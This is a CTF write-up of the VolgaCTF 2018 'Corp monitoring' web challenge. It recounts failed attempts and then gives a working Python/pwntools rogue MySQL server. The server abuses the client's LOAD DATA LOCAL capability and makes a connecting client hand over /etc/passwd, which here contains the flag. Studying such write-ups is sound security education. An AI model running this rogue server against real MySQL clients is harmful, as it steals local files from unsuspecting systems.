# Volgactf CTF 2018

[TOC]

## Web

### Corp monitoring (unsolved, written by bookgin, special thanks to Aleksey)

A monitoring server will monitor the host via this API The timestamp doesn't matter at all.

`http://corpmonitoring.quals.2018.volgactf.ru:5000/api/check_host?target=corpmonitoring.quals.2018.volgactf.ru&_=1521894046582`

We tried some SQL/command injection but failed. 
By scanning the host, we found listening ports 21(ftp),22(ssh),80(http),3306(mysql),5000(monitoring website).
Also, we tried to make the host monitor our server, `/api/check_host?target=MYIP`. The monitoring procedure is:

- TCP handshake with port 21
- TCP handshake with port 22
- HTTP Request to port 80 (no js engines)
- MySQL client `monitoring` with encrypted password connects to port 3306. 
  - If it logs in successfully, execute these queries:
  - SET NAMES 'utf8' COLLATE 'utf8_general_ci'
  - SET @@session.autocommit = OFF
  - SHOW DATABASES

The first idea is to perform a man-in-the-middle attack, making the monitoring host connect to itself and intercepting the query.
However, after the client logins to its own MySQL server, the databaseis empty. We found nothing interesting there.
Soon after, the MySQL server is down because someone changes the password! We ask the admins, and the official said the MySQL server is not required to be up in this challenge.

And... we stuck here for hours. We try to decrpyt the MySQL plaintext password, abuse the MySQL error message as the Flask-SQLAlchemy
 backend will show the error message, but both methods seem impossible.
 

After the competition ends, we ask one of the admins Aleksey about the solution. The main idea behind is http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/. Attack the client directly! What a cool idea!

We make it work after the competition, which gets the flag in a jiffy. Here is the rogue MySQL sever code: Note that it uses [Python3-pwntools](https://github.com/arthaud/python3-pwntools).

```python
#!/usr/bin/env python3
# Python 3.6.4
from pwn import *

server = listen(3306)

server.wait_for_connection()
# Server Greeting
server.send(bytes.fromhex('4a0000000a352e372e32310007000000447601417b4f123700fff7080200ff8115000000000000000000005c121c5e6f7d387a4515755b006d7973716c5f6e61746976655f70617373776f726400'))
# Client login request
print(server.recv())
# Server Response OK
server.send(bytes.fromhex('0700000200000002000000'))
# Client SQL query
print(server.recv())
# Server response with evil
query_ok = bytes.fromhex('0700000200000002000000')
dump_etc_passwd = bytes.fromhex('0c000001fb2f6574632f706173737764')
server.send(dump_etc_passwd)

# This contains the flag VolgaCTF{hoz3foh3wah6ohbaiphahg6ooxumu8ieNg7Tonoo}
print(server.recv())
```


The key is to discover **the client ability** bit in the client login request. However, we forgot to do that :(
```
.... .... 1... .... = Can Use LOAD DATA LOCAL: Set
```

This task has been solved by only 5 teams.

